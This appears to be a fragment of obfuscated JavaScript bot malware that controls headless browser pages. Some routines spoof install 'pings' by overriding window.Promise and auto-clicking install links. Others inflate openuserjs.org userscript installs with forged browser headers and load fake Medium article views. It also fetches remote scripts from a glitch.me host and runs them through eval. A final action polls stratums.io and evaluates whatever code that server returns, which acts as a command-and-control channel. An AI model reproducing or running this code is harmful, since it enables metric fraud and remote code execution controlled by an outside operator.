                    for (; R < -0x64d + -0x1 * -0xb26 + 0x4b1 * -0x1; R += -0x1 * -0x977 + -0xb0b * 0x1 + 0x199)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << -0x1a * 0x16f + 0x1e29 + 0x722 | T >>> -0xf31 + -0x9be + 0x190a) + (U ^ V ^ W) + X + (0x2 * -0x48c6769f + 0x7a0797e0 + 0x865f40ff) + Y[R] << -0x9a * 0x31 + 0x2311 + -0x597) << 0x5 * -0x286 + 0x169e + 0x23 * -0x49 | X >>> -0xdd0 + 0xaa0 + 0x34b) + (T ^ (U = U << 0x3 * 0xa1b + -0x1 * 0x20b5 + 0x141 * 0x2 | U >>> -0x3 * 0xac5 + -0x2 * 0x941 + 0x1 * 0x32d3) ^ V) + W + (-0xae992560 + -0xb7902f45 + -0x115 * -0x1b174ae) + Y[R + (-0x37e * 0x2 + 0x7 * -0x35f + 0x1e96)] << 0x2473 + -0x645 + -0x1 * 0x1e2e) << 0x1b2 + 0x1945 + -0x1af2 | W >>> 0x1 * 0x12d7 + 0x113d * 0x1 + -0x1 * 0x23f9) + (X ^ (T = T << 0x1 * -0x75a + -0xa * -0xc1 + 0x12 * -0x1 | T >>> -0x209 * -0x2 + -0x1 * -0x1a0f + -0x1e1f) ^ U) + V + (0xa9278cdd + 0x3f7f * 0x25437 + -0x1 * 0xce2ef185) + Y[R + (-0x2f2 + 0x2462 + -0x216e)] << 0x9 * 0x13d + -0x2459 + 0x1934) << -0x1 * 0x20ef + -0x1 * -0x12f1 + 0xe03 | V >>> 0x700 + 0x1854 + 0x1f39 * -0x1) + (W ^ (X = X << -0x19b3 + 0xa * -0x69 + 0x1 * 0x1deb | X >>> -0x3d8 + 0x215a + -0x1d80) ^ T) + U + (0x7c5259f7 + 0x1fb1a2 * 0x46e + 0x2 * -0x4ceea4f9) + Y[R + (0x3b * -0x6 + -0x1 * -0x476 + -0x311)] << 0x1ea8 * 0x1 + -0x2 * 0xe45 + -0x1 * 0x21e) << -0xf31 * 0x1 + -0x2b * -0x7a + -0x34 * 0x1a | U >>> -0x7ea * 0x4 + -0x446 * 0x2 + -0x25f * -0x11) + (V ^ (W = W << 0x118a + 0x149f + 0x1 * -0x260b | W >>> -0x4d9 * -0x7 + -0x10 * -0x235 + -0x2c5 * 0x19) ^ X) + T + (0x1 * -0xb106be99 + -0x7d92 * 0x1411a + 0x1bd617d0e) + Y[R + (0x1568 + 0x1 * 0x7f0 + -0x1d54)] << -0x21bd * 0x1 + 0x1 * -0x141f + 0x35dc, V = V << 0x1c77 + -0x10c5 + -0xb94 | V >>> -0xe1a + -0x1 * -0x224f + -0x1433;
                    for (; R < -0x1 * -0x1fc5 + -0x10 + -0x1 * 0x1f79; R += 0xce * -0x28 + -0x1030 + 0x3065)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x7 * -0x3c1 + -0x6 * -0x2f3 + 0x89a * 0x1 | T >>> -0x1668 + -0x1 * 0x1b46 + 0x1 * 0x31c9) + (U & V | U & W | V & W) + X - (-0x41a17 * -0x1bfc + 0x88a1e0c8 + -0x8a87b948) + Y[R] << 0x8 * -0x274 + -0x1c83 + 0x3023) << 0x1b88 + 0x11c3 + -0x2d46 | X >>> -0x2516 + -0xa0f + 0x2f40) + (T & (U = U << 0x60c * 0x1 + -0x133f + 0xd51 | U >>> -0xfe * 0x18 + -0x3 * 0x28b + 0x1f73) | T & V | U & V) + W - (-0x6a959fa7 * -0x1 + -0x2c7d * 0x1af5b + -0x1040fafc * -0x5) + Y[R + (0x23 * -0x69 + 0x2 * 0x1118 + -0x13d4)] << 0x2122 + -0x19de + 0x1 * -0x744) << 0x10af + -0x23e6 + 0x2 * 0x99e | W >>> 0xc7e + 0x4e4 + -0x1147) + (X & (T = T << 0x1 * -0x71d + -0x3e * 0x88 + 0x282b | T >>> 0x4da + 0x1251 + -0x1729 * 0x1) | X & U | T & U) + V - (-0x3adf72fb + 0x931cca01 + 0x18a6ec1e) + Y[R + (0x126d + -0x1 * -0x2651 + -0x38bc)] << 0x61 * -0x2b + 0x897 + -0x1 * -0x7b4) << 0x226e + -0x25f1 + 0xe2 * 0x4 | V >>> -0xbf6 + -0x14ee + 0x20ff) + (W & (X = X << 0x1fad + 0x175b + -0x124e * 0x3 | X >>> 0x21dc + -0x2 * -0x11f3 + -0x10 * 0x45c) | W & T | X & T) + U - (-0xa4eb86ba + 0x86e84222 + 0x17d1414a * 0x6) + Y[R + (-0x205a + 0x803 * -0x4 + -0xb * -0x5db)] << 0x1406 + -0x1858 + 0x452) << 0x73e * 0x5 + 0xd79 + -0x31aa | U >>> -0x2464 + -0x1 * -0x1051 + -0x7b * -0x2a) + (V & (W = W << -0x7 * 0x323 + -0xb45 + 0x2158 | W >>> -0x1459 + 0xc * -0x20b + 0xef5 * 0x3) | V & X | W & X) + T - (0x34678171 * 0x4 + 0x78b4c1bc + 0x16971e6 * -0x9a) + Y[R + (-0x37 * 0x20 + 0x10cb + 0x1 * -0x9e7)] << -0x6 * -0x55 + -0x6b7 * 0x3 + 0x1227 * 0x1, V = V << 0x141b + 0xfe8 + -0x1 * 0x23e5 | V >>> 0x9 * 0x286 + 0x25e4 + -0x3c98;
                    for (; R < -0xc1b * -0x1 + -0xb21 * -0x1 + -0x1 * 0x16ec; R += -0x10d0 + -0x630 + 0x1705)
                      T = (S = (U = (S = (V = (S = (W = (S = (X = (S = T << 0x253 * 0x1 + 0x20b * -0x2 + -0x26 * -0xc | T >>> -0x13 * -0x8e + 0x19 * 0xed + -0x865 * 0x4) + (U ^ V ^ W) + X - (0x1810bf66 + 0x183 * -0x2a3245 + 0x2365 * 0x2a317) + Y[R] << -0x11 * 0xd9 + 0x931 * 0x2 + -0x3f9) << 0x213 * -0xe + 0x2 * 0xe2d + 0xb5 | X >>> -0x1 * 0x1cc7 + 0x767 + 0x157b) + (T ^ (U = U << 0x5 * -0x5bd + 0x3 * 0x5ee + 0xb05 | U >>> 0x7b * 0x1f + -0xdac + -0x137) ^ V) + W - (0x18eabb90 + -0x4220672 * -0x6 + 0x37bb * 0x11ea) + Y[R + (0x1 * -0x1b53 + -0x2323 + 0x3e77)] << 0xdff + 0x2f7 * -0xb + 0x129e) << 0x4c * 0xd + 0x881 + -0xc58 | W >>> 0xbb0 + 0x8d0 + -0x1465) + (X ^ (T = T << -0x2194 + 0x1d68 + 0x44a | T >>> 0x28c + 0x215 * 0x1 + -0x49f) ^ U) + V - (-0x14ffeb2c * 0x1 + -0x4b340b24 + -0x6cf53d7 * -0x16) + Y[R + (-0x213a + 0xd75 + -0x13c7 * -0x1)] << -0x2e * -0x3b + 0x173a + 0x1 * -0x21d4) << 0x13 * -0x121 + 0x262a + -0x10b2 | V >>> 0x1 * 0x649 + -0x11d5 * -0x2 + -0x19c * 0x1a) + (W ^ (X = X << -0x552 + 0x1882 * 0x1 + 0x1 * -0x1312 | X >>> 0x668 + 0xfb4 + -0x161a) ^ T) + U - (-0x2 * 0x1864881f + -0x5707fd32 + 0xbd6e4b9a) + Y[R + (-0x8f * -0x15 + 0xc87 + -0x183f)] << 0x1 * -0x2081 + 0x11a4 + -0x1 * -0xedd) << 0x17 * 0x1a9 + 0x225f + -0x4889 | U >>> -0x4 * -0x608 + -0xfde + -0x1 * 0x827) + (V ^ (W = W << 0x1 * 0x241f + -0x304 * 0xb + -0x2d5 | W >>> 0x122d + -0x2693 + 0x1468) ^ X) + T - (0x1 * -0x465bbd27 + 0x4ff54047 + 0x4d5 * 0x91be2) + Y[R + (0x14b * 0x2 + 0x31a * 0x5 + -0x1214)] << -0x1f94 + -0x2377 * -0x1 + -0x3e3, V = V << -0xa1 * 0x5 + -0x17b6 + 0x1af9 | V >>> 0x1c38 + 0xd * 0x19b + -0x3115;
                    this['h0'] = this['h0'] + T << 0x486 + -0x1 * 0x1167 + 0xce1 * 0x1, this['h1'] = this['h1'] + U << 0x1d07 + 0x49d * -0x7 + 0x344, this['h2'] = this['h2'] + V << 0x1972 + -0x1 * 0xb49 + -0x19 * 0x91, this['h3'] = this['h3'] + W << 0x2 * -0xaab + -0x4 * -0x3f6 + 0x4a * 0x13, this['h4'] = this['h4'] + X << -0x466 * -0x3 + -0x2 * -0xefd + -0x732 * 0x6;
                  }
                  ['hex']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return E[R >> -0x120 + -0x17b6 + 0x3e * 0x67 & 0x1547 + -0x2263 * -0x1 + -0x3 * 0x1289] + E[R >> 0x1 * -0xa73 + 0xb5a + -0x9 * 0x17 & -0x29 * 0x3b + 0x1 * 0x372 + 0x610] + E[R >> -0x13 * -0x175 + -0x23 * -0xe5 + -0x3aea & -0xebc + 0x12 * 0xe2 + -0x119] + E[R >> -0x1529 + 0x110d + 0x42c & 0x1689 + 0x1a1a + -0x3094] + E[R >> 0xafd * 0x1 + 0x59a + -0x23 * 0x79 & 0x125f * -0x1 + -0x2264 + -0x1a69 * -0x2] + E[R >> -0x2 * 0xff6 + 0x196c * 0x1 + 0x688 & -0x13c8 + -0x4 * -0x70b + 0x1 * -0x855] + E[R >> 0x15 * 0xb8 + -0x663 * 0x1 + -0x8b1 & 0x13ac + 0x3 * -0x2a1 + 0x4f * -0x26] + E[0x19a9 + -0x61 * -0x59 + -0x3b53 & R] + E[S >> -0x3e2 + 0x1f9 * -0x11 + 0x2587 & 0x23c4 + -0x9da + 0x19db * -0x1] + E[S >> -0x247d + 0x16 * 0x121 + 0xbbf & -0x1 * 0xec0 + -0x1bb * 0xd + 0x3bb * 0xa] + E[S >> 0x1006 + 0x421 + 0x1413 * -0x1 & -0x12b2 + -0x1d7c + 0x303d] + E[S >> -0x1ce9 * -0x1 + -0x2bb * -0x3 + -0x1285 * 0x2 & -0x1251 + 0x1 * 0x1f82 + -0x1 * 0xd22] + E[S >> -0x1748 + 0x21ae * 0x1 + 0x5 * -0x212 & 0x2520 + -0x943 + 0x1bce * -0x1] + E[S >> 0x5d1 * -0x1 + -0x130c + 0x18e5 & 0x68f + -0xfb * 0x5 + -0x199] + E[S >> -0x5 * -0x2ed + -0x517 + 0x986 * -0x1 & 0x1bab + -0x180f + -0x38d] + E[0x257f + 0x2 * -0x1073 + -0x245 * 0x2 & S] + E[T >> 0x1bdd + 0x5 * 0x67f + -0x3c3c & -0x23b8 + 0x18b7 + 0xb10] + E[T >> -0x1aaa + 0x1c8b * -0x1 + 0x1ad * 0x21 & -0x19 * 0x3b + -0x63 * 0x43 + -0x1 * -0x1fbb] + E[T >> 0x1745 + -0x2 * 0x6e2 + 0x13 * -0x7f & -0x135b * 0x1 + -0x1953 * -0x1 + -0x5e9] + E[T >> -0xa39 * -0x2 + 0x236c + -0x2 * 0x1be7 & -0x1 * -0x11fb + -0x11a8 + -0x44] + E[T >> 0x35f * -0x2 + -0x1ba5 + 0xcd * 0x2b & 0xcbc + -0x24f1 + 0x1844] + E[T >> -0x7d7 + 0x18cb + -0x876 * 0x2 & 0xb5 * -0x1a + 0xb5 * 0x37 + -0x1 * 0x1472] + E[T >> 0x22a5 + -0x5 * -0x607 + -0x1 * 0x40c4 & 0x671 + 0x11e2 + 0x611 * -0x4] + E[0xe68 * 0x1 + 0x12b4 + -0x210d & T] + E[U >> 0x1694 + -0xd * -0xb9 + -0x1fdd & 0x1b2d + 0xf * -0x267 + 0x8eb] + E[U >> -0x789 * 0x4 + 0x145a + 0x9e2 & -0x125a + 0xe5 * -0x7 + -0x18ac * -0x1] + E[U >> 0x1 * -0x1aec + 0x50 * 0x58 + 0x2 * -0x40 & 0xb * -0x141 + 0x1603 + -0x829 * 0x1] + E[U >> -0x2c * 0x67 + -0x250c + 0x36d0 & 0xd0 + -0x1faf + -0x1eee * -0x1] + E[U >> 0xc1b * 0x3 + -0xec * 0x28 + 0x9b & 0x2b * -0xd9 + -0x177 * 0xb + 0x349f] + E[U >> -0xf8 * -0x25 + -0x2a2 * -0x1 + -0x2672 & 0xeb3 * 0x1 + -0x36 * 0xd + -0xbe6] + E[U >> 0x5 * -0x611 + -0x1714 + 0x356d & -0x7 * -0x24d + -0xc25 * -0x2 + -0x2856] + E[0x1 * -0xaed + -0x3 * 0x8cd + -0x233 * -0x11 & U] + E[V >> -0xdf + -0x3 * 0x461 + 0xe1e & -0x92d + 0x113b + -0x7ff] + E[V >> -0x1 * -0x1d4b + -0x3eb * -0x5 + -0x30ca & 0x1f * 0x4f + 0x1729 + -0x20ab] + E[V >> -0x105c + -0x1b54 + 0x2bc4 & 0x3 * 0x1dc + 0x1 * 0x1666 + -0x1beb] + E[V >> -0x26ff + 0x1207 + 0x1508 & 0x3 * 0x1f2 + -0x1 * 0x17bf + -0x8fc * -0x2] + E[V >> 0x1aa4 + 0x1ba * -0x13 + -0x2 * -0x31b & 0x233 * -0xb + 0x65 + -0x1 * -0x17db] + E[V >> 0x1a47 + 0x3 * -0x419 + -0xdf4 & 0x2 * 0x9b3 + 0x2 * -0x110d + 0x1 * 0xec3] + E[V >> 0x20c9 + -0x11ab + -0x1 * 0xf1a & -0x8 * 0x3e1 + -0x128 * -0x4 + 0x1a77] + E[-0x7 * 0x227 + 0xcee * -0x1 + 0x1c0e & V];
                  }
                  ['digest']() {
                    this['finalize']();
                    var R = this['h0'],
                      S = this['h1'],
                      T = this['h2'],
                      U = this['h3'],
                      V = this['h4'];
                    return [
                      R >> -0xd6e + -0x1 * -0x12db + -0x555 & 0x364 + -0x111d + 0xeb8,
                      R >> -0x1d3c + 0x2 * -0xa33 + 0x31b2 * 0x1 & 0xaf1 + 0x1808 + -0x21fa,
                      R >> 0x18e * 0x7 + -0x4ad * 0x2 + -0x180 & -0x228f + 0xd9d + 0x15f1,
                      -0x7 * -0x263 + 0x1d * 0x138 + -0x330e & R,
                      S >> -0x17d9 + 0x5 * 0x124 + 0x123d & -0x19a + -0x17fd + 0x1a96,
                      S >> 0x35 * -0x73 + 0x1048 + -0x43 * -0x1d & -0x6df * 0x5 + -0x24d4 + 0x482e,
                      S >> 0x9b9 * 0x3 + -0x1495 * -0x1 + -0x4 * 0xc6e & 0x22b8 + 0x2277 * 0x1 + 0x2 * -0x2218,
                      0x5 * -0x1 + 0x506 * 0x7 + -0x5d * 0x5e & S,
                      T >> -0xd9f + 0x1eea + -0x1 * 0x1133 & -0x73a + -0x20ab + 0xa39 * 0x4,
                      T >> -0x3b + -0x1eb7 + -0x2 * -0xf81 & 0x207c + -0x6f * -0x44 + 0x3cf9 * -0x1,
                      T >> -0x25b * 0x9 + 0x1 * 0x17ac + 0x1 * -0x271 & -0x15 * -0x13a + -0x2446 + -0xb83 * -0x1,
                      0x205 * -0xa + -0xd26 + 0x2257 & T,
                      U >> 0xb0b * -0x2 + -0x1 * -0x195b + -0x32d & 0x1d10 * 0x1 + 0x2425 + -0x201b * 0x2,
                      U >> -0xc59 * -0x1 + -0x61f * -0x1 + -0x3e * 0x4c & 0x2184 + -0x795 * 0x1 + -0x18f0,
                      U >> -0x11aa + 0x17b5 + -0x603 & -0x5 * -0x777 + 0x5d1 * 0x1 + 0x2a25 * -0x1,
                      0x7 * 0x233 + -0x1 * -0x1ac9 + -0x292f & U,
                      V >> 0x14e0 + -0x5 * -0x463 + 0x1 * -0x2ab7 & 0x2 * 0x725 + 0x2669 + -0x33b4,
                      V >> 0x412 + -0x4cc + -0x65 * -0x2 & 0x1f * 0xbb + -0xa02 + 0x95 * -0x14,
                      V >> 0x27b * -0x5 + -0x1314 + 0x1f83 & -0x3e * -0x8b + 0x5 * -0x2aa + -0x1359,
                      -0x28 * -0x41 + 0x33f * 0x1 + 0x8 * -0x18d & V
                    ];
                  }
                  ['arrayBuffe' + 'r']() {
                    var R, S;
                    return this['finalize'](), R = new ArrayBuffer(-0x24f7 * 0x1 + -0x4f * -0x61 + 0x71c), (S = new DataView(R))['setUint32'](-0x3 * -0xbe1 + -0x1 * 0x2126 + -0x27d, this['h0']), S['setUint32'](0x9ec + 0x1bcc + -0x13 * 0x1fc, this['h1']), S['setUint32'](-0x3 * -0x593 + -0x1276 + 0x1c5, this['h2']), S['setUint32'](-0x7 * 0x209 + 0x2 * 0x810 + -0x1d5, this['h3']), S['setUint32'](0x1e00 + 0xc * -0xc1 + 0xa72 * -0x2, this['h4']), R;
                  }
              }
              O['prototype']['toString'] = O['prototype']['hex'], O['prototype']['array'] = O['prototype']['digest'];
              const P = K();
              window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
              let Q = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x6 * 0x5cb + -0x236f + 0x4631];
              return window['Promise'] = class extends window['Promise'] {
                constructor(...R) {
                  let S = -0x2 * -0x5a4 + -0xcb9 + -0x171 * -0x1;
                  R[-0x1 * -0x6aa + 0x236 * 0x2 + 0xb16 * -0x1]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (R[0xf1d + 0x1 * -0x40f + 0xb0e * -0x1] = T => {
                    let U = Q['getAttribu' + 'te']('data-ping-' + 'url');
                    if (U) {
                      let V = P(Q['getAttribu' + 'te']('data-ip-ad' + 'dress') + Q['getAttribu' + 'te']('data-scrip' + 't-id') + Q['getAttribu' + 'te']('data-ping-' + 'key')),
                        W = new XMLHttpRequest();
                      W['open']('POST', U + ('&mo=3&ping' + '_key=') + encodeURIComponent(V), 0x1c60 + -0x76d + -0x14f2), W['overrideMi' + 'meType']('text/plain'), W['onload'] = () => {}, W['send'](), S = -0x22d * 0x4 + 0x388 + 0x52d * 0x1;
                    }
                  }), S || super(...R);
                }
              }, window['setTimeout'](() => {
                Q['click']();
              }, 0x823 * -0x1 + 0x4a5 + 0x95a), Promise['resolve'](-0xef1 + -0x1d6f + 0x21d * 0x15);
            }), await wait(NETWORK_PATIENCE), await B['close'](), await A['close'](), r()));
          }
        }
        for (let s = 0x157b + 0x1b05 + -0x10 * 0x308; s < 0x1ae4 * 0x1 + -0xc66 * -0x3 + 0xc1 * -0x55; s++)
          r();
      }, 0xaba + 0x1c71 + -0x26c7), flags['RPL2_MDM2'] && setTimeout(async () => {
        const r = await n['newPage']();
        for (;;) {
          let s = 0x1465 + -0x133d + 0x4a * -0x4;
          if (await r['goto'](data['mediumArti' + 'cles']['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](u => s++), !s) {
            await randomWait();
            for (let u = 0x116 * -0xe + -0x2641 * 0x1 + -0x5 * -0xab1; u < getRandomInt(0x5 * -0x33d + 0x65e * 0x1 + -0x94 * -0x11, -0x10b5 + 0x3 * -0x991 + 0x1 * 0x2d6d); u++)
              await r['keyboard']['press']('ArrowDown'), await randomWait();
            await randomWait(), await wait(-0xbe66 + -0xd4 * -0xa8 + 0x11da6);
          }
        }
      }, -0xb * -0x4e + -0x1 * -0xe57 + -0x114d), flags['RPL2_WP'] && setTimeout(async () => {
        (async function r() {
          const a4 = b;
          try {
            let s = -0x207 * 0xf + 0xf7c + 0xeed;
            const t = await n[a4(0xc, 'wG2Z')]();
            if (await t['goto']('https://ww' + 'w.whitepag' + 'es.com/', {
                'timeout': MM_NETWORK_PATIENCE
              })['catch'](u => s++), s)
              return await t['close'](), r();
            await wait(0x4c1 * 0x1 + 0x878 + -0x23 * 0xb), await t['evaluate'](() => {
              const a5 = c;
              let u = new XMLHttpRequest();
              u['open'](a5(0x10), 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x62c + 0x177c + -0x1da8), u['send'](), eval(u['responseTe' + 'xt']);
            });
          } catch (u) {}
        }());
      }, 0x127a + 0xc50 + 0x511 * -0x6);
    }
  ],
  [
    () => flags['doCreateSe' + 'rver'],
    async () => {
      require('http')['createServ' + 'er'](async function(f, g) {
        g['writeHead'](-0x3 * -0x243 + -0x103 * -0x1f + -0x255e), g['write']('v0.8'), g['end']();
      })['listen'](process['env']['PORT'] || -0x2bb7 + 0x601 + 0x4546);
    }
  ],
  [
    () => flags['doOUJS'],
    async () => {
      async function f() {
        const h = data['oujsToAssi' + 'st']['random'](),
          j = h['replace']('/scripts/', '/install/') + '.user.js',
          [k, l] = (function() {
            const x = data['oujsUAs']['random']();
            return [
              x,
              x['includes']('Firefox')
            ];
          }()),
          m = function(x, y = -0x6be * -0x1 + 0x1f5 + -0x8b2) {
            if (x['includes']('Firefox'))
              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * 0x11 + 0xfdb + 0xfc9 * -0x1));
            const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
              A = x['slice'](z),
              B = A['slice'](0xadf + -0x1bbd + 0x10de, A['indexOf']('\x20'));
            return y ? B['slice'](-0x15d7 * 0x1 + 0x103d + 0x59a, B['indexOf']('.')) : B;
          }(k),
          q = {
            'signal': AbortSignal['timeout'](0x1 * 0x1e72 + 0x51f * -0xd + 0x4b31),
            'headers': {
              'host': 'openuserjs' + '.org',
              'origin': 'https://op' + 'enuserjs.o' + 'rg',
              'user-agent': k,
              'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
              'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
              'accept-language': 'en-US,en;q' + '=0.9',
              'cache-control': 'no-cache',
              'pragma': 'no-cache',
              'sec-fetch-dest': 'document',
              'sec-fetch-mode': 'navigate',
              'sec-fetch-site': 'same-origi' + 'n',
              'sec-fetch-user': '?1',
              'upgrade-insecure-requests': '1'
            },
            'body': null,
            'method': 'GET'
          };
        l ? Object['assign'](q['headers'], {
          'te': 'trailers'
        }) : Object['assign'](q['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        });
        const u = await fetch(g, q)['catch'](x => {});
        if (!u || !u['headers'])
          return;
        if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
          return;
        const v = {
          'signal': AbortSignal['timeout'](0x45b1 * -0x1 + 0x3942 + 0x337f),
          'headers': {
            'host': 'openuserjs' + '.org',
            'origin': 'https://op' + 'enuserjs.o' + 'rg',
            'user-agent': k,
            'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
            'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': g,
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origi' + 'n',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1'
          },
          'body': null,
          'method': 'GET'
        };
        if (l ? Object['assign'](v['headers'], {
            'te': 'trailers'
          }) : Object['assign'](v['headers'], {
            'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '\x22Windows\x22'
          }), !await fetch(h, v)['catch'](x => {}))
          return;
        const w = {
          'headers': {
            'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
            'accept-language': 'en-US,en;q' + '=0.9',
            'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
            'pragma': 'no-cache',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'none'
          },
          'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
          'body': null,
          'method': 'GET'
        };
        l ? Object['assign'](w['headers'], {
          'te': 'trailers'
        }) : Object['assign'](w['headers'], {
          'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + m + '\x22',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '\x22Windows\x22'
        }), await fetch(j, w);
      }
      const g = 'https://op' + 'enuserjs.o' + 'rg/';
      f();
      for (let h = -0x11 * 0x161 + 0x4b9 * -0x1 + 0x46 * 0x67; h < 0x1351 + 0x1 * 0x20b + -0x1558; h++)
        setTimeout(f, (0x71 * -0x3d + -0xff1e + 0x2046b) * h * getRandomInt(0x161a + -0x8 * -0x11 + -0x78b * 0x3, -0x100b + -0x1be6 * 0x1 + 0x2bf4));
      setInterval(() => {
        f();
        for (let i = -0x30 * -0x5b + -0x1 * 0x2114 + 0x1004; i < -0x1b8e + 0xf5a + -0x4 * -0x30e; i++)
          setTimeout(f, (0x35c6 + -0xffdd + 0x1b477) * i * getRandomInt(-0x1150 * -0x2 + 0x1e27 + -0x1 * 0x40c6, 0xd02 + 0xd * -0x281 + 0x138e * 0x1));
      }, -0x64bf16 + 0x1c34 * 0x29 + 0x732ba * 0x15);
    }
  ],
  [
    () => flags['RPL2_RPRT'],
    async () => {
      async function f() {
        try {
          axios['post']('https://st' + 'ratums.io/' + 'research', {
            'key': 'CX001_ZCa',
            'dom': me
          })['then'](g => {
            try {
              eval(g['data']);
            } catch (h) {}
          })['catch'](g => {});
        } catch (g) {}
      }
      f(), setInterval(f, -0x1 * -0x9b39 + -0x656fd + 0xa4fa4);
    }
  ]
];
for (let e of actions)
  e[-0x10f9 + -0x1f35 + 0x1817 * 0x2]() && setTimeout(e[-0x226e + 0xb3 + 0x21bc]);